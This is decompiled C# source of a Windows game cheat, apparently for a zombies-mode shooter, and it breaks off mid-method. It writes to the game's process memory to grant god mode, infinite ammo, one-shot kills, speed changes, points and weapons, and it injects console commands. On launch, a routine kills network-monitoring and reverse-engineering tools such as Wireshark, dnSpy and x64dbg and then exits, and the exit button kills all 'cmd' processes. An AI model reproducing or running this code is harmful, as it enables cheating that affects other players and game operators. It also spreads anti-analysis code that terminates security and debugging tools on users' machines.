using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.CSharp.RuntimeBinder;
using Microsoft.Win32;
using Teen;

namespace yktv
{
	// Token: 0x02000034 RID: 52
	public partial class Main : Form
	{
		// Token: 0x060001B5 RID: 437 RVA: 0x0000B560 File Offset: 0x0000B560
		public Main()
		{
			Main.ProcessCheck();
		}

		// Token: 0x060001B6 RID: 438
		[DllImport("user32.dll")]
		public static extern uint SetWindowDisplayAffinity(IntPtr hwnd, uint dwAffinity);

		// Token: 0x060001B7 RID: 439 RVA: 0x0000B99C File Offset: 0x0000B99C
		private long GetGEntity(int entNum)
		{
			if (Main.<>o__22.<>p__0 == null)
			{
				Main.<>o__22.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(bool), typeof(Main)));
			}
			long result;
			if (Main.<>o__22.<>p__0.Target(Main.<>o__22.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				result = this.mem.ReadInt64(this.mem.BaseAddress + this.gEntityOffset) + (long)(1528 * entNum);
			}
			else
			{
				result = 0L;
			}
			return result;
		}

		// Token: 0x060001B8 RID: 440 RVA: 0x0000BA28 File Offset: 0x0000BA28
		private long GetGClient(int clientNum)
		{
			if (Main.<>o__23.<>p__0 == null)
			{
				Main.<>o__23.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__23.<>p__0.Target(Main.<>o__23.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				return this.mem.ReadInt64(this.mem.BaseAddress + this.gClientOffset) + (long)(47408 * clientNum);
			}
			return 0L;
		}

		// Token: 0x060001B9 RID: 441 RVA: 0x0000BAB8 File Offset: 0x0000BAB8
		public static void ProcessCheck()
		{
			foreach (string processName in new string[]
			{
				"solarwinds",
				"paessler",
				"fiddler",
				"cpacket",
				"Wireshark",
				"the wireshark network analyzer",
				"Ethereal",
				"sectools",
				"riverbed",
				"tcpdump",
				"Kismet",
				"EtherApe",
				"telerik",
				"glasswire",
				"dnspy",
				"dnSpy-x86",
				"dotPeek64",
				"dotPeek32",
				"ollydbg",
				"x32dgb",
				"x64dbg",
				"HxD",
				"de4dot",
				"megadumper",
				"extremedumper",
				"Scylla",
				"httpdebugger",
				"http-debugger",
				"Fiddler"
			})
			{
				if (Process.GetProcessesByName(processName).Length != 0)
				{
					foreach (Process process in Process.GetProcessesByName(processName))
					{
						if (Process.GetProcessesByName(processName).ToString().Contains("http"))
						{
							process.Kill();
						}
						process.Kill();
					}
					MessageBox.Show("Running Suspicious Program(s). Exiting Program.");
					Environment.Exit(0);
				}
			}
		}

		// Token: 0x060001BA RID: 442 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenForm1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001BB RID: 443 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenControlBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001BC RID: 444 RVA: 0x0000BC3C File Offset: 0x0000BC3C
		private void thirteenButton1_Click(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("cmd");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Assets2");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			Environment.Exit(0);
		}

		// Token: 0x060001BD RID: 445 RVA: 0x00003B97 File Offset: 0x00003B97
		private void thirteenButton2_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x060001BE RID: 446 RVA: 0x0000BC94 File Offset: 0x0000BC94
		private void thirteenButton3_Click(object sender, EventArgs e)
		{
			if (Main.<>o__30.<>p__0 == null)
			{
				Main.<>o__30.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__30.<>p__0.Target(Main.<>o__30.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					this.mem.WriteFloat(gclient + this.speedLong, Convert.ToSingle(this.speedBox.Text));
				}
			}
		}

		// Token: 0x060001BF RID: 447 RVA: 0x0000BD34 File Offset: 0x0000BD34
		private void thirteenButton4_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure you want to use this? This feature is unsafe and may result in a ban.", "Warning!", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				if (Main.<>o__31.<>p__0 == null)
				{
					Main.<>o__31.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__31.<>p__0.Target(Main.<>o__31.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					this.mem.WriteFloat(this.mem.BaseAddress + 263188624L + 124L, float.Parse(this.timescaleText.Text));
				}
			}
		}

		// Token: 0x060001C0 RID: 448 RVA: 0x0000BDE4 File Offset: 0x0000BDE4
		private void thirteenButton5_Click(object sender, EventArgs e)
		{
			if (Main.<>o__32.<>p__0 == null)
			{
				Main.<>o__32.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__32.<>p__0.Target(Main.<>o__32.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					this.mem.WriteUInt(gclient + 3684L, 2684354560U);
				}
			}
		}

		// Token: 0x060001C1 RID: 449 RVA: 0x0000BE78 File Offset: 0x0000BE78
		private void BW_ReadCurrentWeapon_DoWork(object sender, DoWorkEventArgs e)
		{
			for (;;)
			{
				if (Main.<>o__33.<>p__0 == null)
				{
					Main.<>o__33.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__33.<>p__0.Target(Main.<>o__33.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					long gclient = this.GetGClient(0);
					if (gclient != 0L)
					{
						this.Lbl_CurrentWeaponIndex.Text = string.Format("Current Weapon: {0}", this.mem.ReadInt(gclient + 40L));
					}
				}
				Thread.Sleep(500);
			}
		}

		// Token: 0x060001C2 RID: 450 RVA: 0x0000BF24 File Offset: 0x0000BF24
		private void godCheck_CheckedChanged(object sender, EventArgs e)
		{
			if (this.godCheck.Checked)
			{
				if (Main.<>o__34.<>p__0 == null)
				{
					Main.<>o__34.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__34.<>p__0.Target(Main.<>o__34.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					for (int i = 0; i < 4; i++)
					{
						long gclient = this.GetGClient(i);
						this.mem.WriteUInt(gclient + 3684L, 2684354560U);
					}
					return;
				}
			}
			else
			{
				if (Main.<>o__34.<>p__1 == null)
				{
					Main.<>o__34.<>p__1 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__34.<>p__1.Target(Main.<>o__34.<>p__1, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					for (int j = 0; j < 4; j++)
					{
						long gclient2 = this.GetGClient(j);
						this.mem.WriteUInt(gclient2 + 3684L, 536870912U);
					}
				}
			}
		}

		// Token: 0x060001C3 RID: 451 RVA: 0x0000C051 File Offset: 0x0000C051
		private void ammoCheck_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ammoCheck.Checked)
			{
				this.zm_infiniteAmmo.RunWorkerAsync();
				return;
			}
			this.zm_infiniteAmmo.CancelAsync();
		}

		// Token: 0x060001C4 RID: 452 RVA: 0x0000C078 File Offset: 0x0000C078
		private void zm_infiniteAmmo_DoWork(object sender, DoWorkEventArgs e)
		{
			while (this.ammoCheck.Checked)
			{
				if (Main.<>o__36.<>p__0 == null)
				{
					Main.<>o__36.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__36.<>p__0.Target(Main.<>o__36.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					for (int i = 0; i < 4; i++)
					{
						long gclient = this.GetGClient(i);
						this.mem.WriteInt(gclient + 4968L, 50);
						this.mem.WriteInt(gclient + 4976L, 50);
						this.mem.WriteInt(gclient + 5080L, 50);
						this.mem.WriteInt(gclient + 5084L, 50);
						this.mem.WriteInt(gclient + 5088L, 50);
						this.mem.WriteInt(gclient + 5076L, 50);
						this.mem.WriteInt(gclient + 5100L, 50);
						this.mem.WriteInt(gclient + 5092L, 50);
						this.mem.WriteInt(gclient + 5096L, 50);
					}
				}
				Thread.Sleep(100);
			}
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x0000C1D5 File Offset: 0x0000C1D5
		private void oneshotCheck_CheckedChanged(object sender, EventArgs e)
		{
			if (this.oneshotCheck.Checked)
			{
				this.zm_oneshotKill.RunWorkerAsync();
				return;
			}
			this.zm_oneshotKill.CancelAsync();
		}

		// Token: 0x060001C6 RID: 454 RVA: 0x0000C1FC File Offset: 0x0000C1FC
		private void zm_oneshotKill_DoWork(object sender, DoWorkEventArgs e)
		{
			while (this.oneshotCheck.Checked)
			{
				if (Main.<>o__38.<>p__0 == null)
				{
					Main.<>o__38.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__38.<>p__0.Target(Main.<>o__38.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					for (int i = 137; i < 178; i++)
					{
						long gentity = this.GetGEntity(i);
						if (this.mem.ReadInt(gentity + 920L) != 0)
						{
							this.mem.WriteInt(gentity + 920L, 1);
						}
					}
				}
				Thread.Sleep(50);
			}
		}

		// Token: 0x060001C7 RID: 455 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton5_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x060001C8 RID: 456 RVA: 0x0000C2C8 File Offset: 0x0000C2C8
		private void thirteenButton5_Click_2(object sender, EventArgs e)
		{
			if (Main.<>o__40.<>p__0 == null)
			{
				Main.<>o__40.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__40.<>p__0.Target(Main.<>o__40.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					this.mem.WriteInt(gclient + 40L, Convert.ToInt32(this.weaponBox.Text));
				}
			}
		}

		// Token: 0x060001C9 RID: 457 RVA: 0x0000C364 File Offset: 0x0000C364
		private void thirteenButton6_Click(object sender, EventArgs e)
		{
			if (Main.<>o__41.<>p__0 == null)
			{
				Main.<>o__41.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__41.<>p__0.Target(Main.<>o__41.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					this.mem.WriteInt(gclient + 240L, Convert.ToInt32(this.weaponBox.Text));
				}
			}
		}

		// Token: 0x060001CA RID: 458 RVA: 0x0000C404 File Offset: 0x0000C404
		private void thirteenButton7_Click(object sender, EventArgs e)
		{
			if (Main.<>o__42.<>p__0 == null)
			{
				Main.<>o__42.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__42.<>p__0.Target(Main.<>o__42.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					this.mem.WriteInt(gclient + this.moneyPTR, Convert.ToInt32(this.pointsText.Text));
				}
			}
		}

		// Token: 0x060001CB RID: 459 RVA: 0x0000C4A4 File Offset: 0x0000C4A4
		private void thirteenButton5_Click_3(object sender, EventArgs e)
		{
			if (Main.<>o__43.<>p__0 == null)
			{
				Main.<>o__43.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__43.<>p__0.Target(Main.<>o__43.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				File.WriteAllBytes("MP-PM.bin", this.mem.ReadBytes(this.mem.BaseAddress + gclient, 93632));
			}
		}

		// Token: 0x060001CC RID: 460 RVA: 0x0000C53C File Offset: 0x0000C53C
		private void thirteenButton8_Click(object sender, EventArgs e)
		{
			Main.ProcessCheck();
			this.dataGridView1.Rows.Clear();
			if (Main.<>o__44.<>p__0 == null)
			{
				Main.<>o__44.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__44.<>p__0.Target(Main.<>o__44.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				for (int i = 0; i < 4; i++)
				{
					long gclient = this.GetGClient(i);
					string text = this.mem.ReadString(gclient + this.namePTR);
					if (text != "" || text != null)
					{
						this.dataGridView1.Rows.Add();
						this.dataGridView1[0, i].Value = text;
					}
				}
			}
		}

		// Token: 0x060001CD RID: 461 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton9_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001CE RID: 462 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton10_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001CF RID: 463 RVA: 0x0000C614 File Offset: 0x0000C614
		private void thirteenButton9_Click_1(object sender, EventArgs e)
		{
			MessageBox.Show("Open the weapons.txt file in the folder, and put the number for the weapon in the textbox.");
		}

		// Token: 0x060001D0 RID: 464 RVA: 0x0000C624 File Offset: 0x0000C624
		private void thirteenButton10_Click_1(object sender, EventArgs e)
		{
			if (Main.<>o__48.<>p__0 == null)
			{
				Main.<>o__48.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__48.<>p__0.Target(Main.<>o__48.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.sendCbuf(this.cbufText.Text);
			}
		}

		// Token: 0x060001D1 RID: 465 RVA: 0x0000C69C File Offset: 0x0000C69C
		private void thirteenButton11_Click(object sender, EventArgs e)
		{
			if (Main.<>o__49.<>p__0 == null)
			{
				Main.<>o__49.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__49.<>p__0.Target(Main.<>o__49.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.mem.WriteString(this.mem.ReadInt64(this.mem.BaseAddress + this.cbufOffset), "fast_restart;");
				this.mem.WriteInt(this.mem.BaseAddress + this.cbufOffset2, 13);
			}
		}

		// Token: 0x060001D2 RID: 466 RVA: 0x0000C750 File Offset: 0x0000C750
		private void godModeOnToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__50.<>p__0 == null)
			{
				Main.<>o__50.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__50.<>p__0.Target(Main.<>o__50.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteUInt(gclient + 3684L, 2684354560U);
			}
		}

		// Token: 0x060001D3 RID: 467 RVA: 0x0000C7F4 File Offset: 0x0000C7F4
		private void godModeOffToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__51.<>p__0 == null)
			{
				Main.<>o__51.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__51.<>p__0.Target(Main.<>o__51.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteUInt(gclient + 3684L, 536870912U);
			}
		}

		// Token: 0x060001D4 RID: 468 RVA: 0x0000C898 File Offset: 0x0000C898
		private void normalSpeedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__52.<>p__0 == null)
			{
				Main.<>o__52.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__52.<>p__0.Target(Main.<>o__52.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteFloat(gclient + this.speedLong, 1f);
			}
		}

		// Token: 0x060001D5 RID: 469 RVA: 0x0000C93C File Offset: 0x0000C93C
		private void doubleSpeedToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__53.<>p__0 == null)
			{
				Main.<>o__53.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__53.<>p__0.Target(Main.<>o__53.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteFloat(gclient + this.speedLong, 2f);
			}
		}

		// Token: 0x060001D6 RID: 470 RVA: 0x0000C9E0 File Offset: 0x0000C9E0
		private void add10000PointsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__54.<>p__0 == null)
			{
				Main.<>o__54.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__54.<>p__0.Target(Main.<>o__54.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteInt(gclient + this.moneyPTR, 10000);
			}
		}

		// Token: 0x060001D7 RID: 471 RVA: 0x0000CA84 File Offset: 0x0000CA84
		private void add25000PointsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__55.<>p__0 == null)
			{
				Main.<>o__55.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__55.<>p__0.Target(Main.<>o__55.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteInt(gclient + this.moneyPTR, 25000);
			}
		}

		// Token: 0x060001D8 RID: 472 RVA: 0x0000CB28 File Offset: 0x0000CB28
		private void add100000PointsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__56.<>p__0 == null)
			{
				Main.<>o__56.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__56.<>p__0.Target(Main.<>o__56.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteInt(gclient + this.moneyPTR, 100000);
			}
		}

		// Token: 0x060001D9 RID: 473 RVA: 0x00005140 File Offset: 0x00005140
		private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x060001DA RID: 474 RVA: 0x0000CBCC File Offset: 0x0000CBCC
		private void giveRayGunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__58.<>p__0 == null)
			{
				Main.<>o__58.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__58.<>p__0.Target(Main.<>o__58.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteInt(gclient + 240L, 40);
			}
		}

		// Token: 0x060001DB RID: 475 RVA: 0x0000CC6C File Offset: 0x0000CC6C
		private void giveShockwaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__59.<>p__0 == null)
			{
				Main.<>o__59.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__59.<>p__0.Target(Main.<>o__59.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteInt(gclient + 240L, 20);
			}
		}

		// Token: 0x060001DC RID: 476 RVA: 0x0000CD0C File Offset: 0x0000CD0C
		private void giveWarMachineToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__60.<>p__0 == null)
			{
				Main.<>o__60.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__60.<>p__0.Target(Main.<>o__60.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteInt(gclient + 240L, 89);
			}
		}

		// Token: 0x060001DD RID: 477 RVA: 0x0000CDAA File Offset: 0x0000CDAA
		private static string convertIp(byte[] ip)
		{
			return string.Format("{0}.{1}.{2}.{3}", new object[]
			{
				ip[0],
				ip[1],
				ip[2],
				ip[3]
			});
		}

		// Token: 0x060001DE RID: 478 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton12_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060001DF RID: 479 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox2_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060001E0 RID: 480 RVA: 0x00005140 File Offset: 0x00005140
		private void mp_infiniteAmmo_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x060001E1 RID: 481 RVA: 0x0000CDE8 File Offset: 0x0000CDE8
		private void thirteenButton13_Click(object sender, EventArgs e)
		{
			if (Main.<>o__65.<>p__0 == null)
			{
				Main.<>o__65.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__65.<>p__0.Target(Main.<>o__65.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				if (gclient != 0L)
				{
					this.TeleportPos[0] = this.mem.ReadFloat(gclient + 3560L);
					this.TeleportPos[1] = this.mem.ReadFloat(gclient + 3564L);
					this.TeleportPos[2] = this.mem.ReadFloat(gclient + 3568L);
				}
			}
		}

		// Token: 0x060001E2 RID: 482 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox2_CheckedChanged_1(object sender, EventArgs e)
		{
		}

		// Token: 0x060001E3 RID: 483 RVA: 0x00005140 File Offset: 0x00005140
		private void mp_teleportbots_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x060001E4 RID: 484 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox3_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060001E5 RID: 485 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox4_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060001E6 RID: 486 RVA: 0x00005140 File Offset: 0x00005140
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060001E7 RID: 487 RVA: 0x0000CEAC File Offset: 0x0000CEAC
		private void giveCombatBowToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__71.<>p__0 == null)
			{
				Main.<>o__71.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__71.<>p__0.Target(Main.<>o__71.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.Rows[this.dataGridView1.CurrentRow.Index].Cells[0]));
				this.mem.WriteInt(gclient + 240L, 182);
			}
		}

		// Token: 0x060001E8 RID: 488 RVA: 0x00005140 File Offset: 0x00005140
		private void skipRounds_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x060001E9 RID: 489 RVA: 0x0000CF64 File Offset: 0x0000CF64
		private void thirteenButton14_Click(object sender, EventArgs e)
		{
			if (Main.<>o__73.<>p__0 == null)
			{
